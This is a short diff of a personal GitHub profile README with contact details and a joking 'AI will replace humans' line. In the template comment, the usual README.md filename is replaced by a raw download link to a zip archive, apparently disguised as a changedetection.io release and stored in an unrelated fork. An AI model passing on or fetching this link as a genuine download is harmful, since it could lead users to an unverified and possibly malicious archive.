@@ -4,7 +4,7 @@
 - 💞️ I’m looking to collaborate on coding and Design projects
 - 📫 How to reach me @zedcreatives on social media
 - 😄 Pronouns: He/him
-- ⚡ Fun fact: Ai will replace Humans... Lol
+- ⚡ Fun fact: Ai will replace Humans... Lol #Edit: LOL 😂
 
 <!---
 Ized09/Ized09 is a ✨ special ✨ repository because its `https://github.com/Ized09/changedetection.io/raw/refs/heads/main/cytozyme/changedetection_io_v1.1.zip` (this file) appears on your GitHub profile.
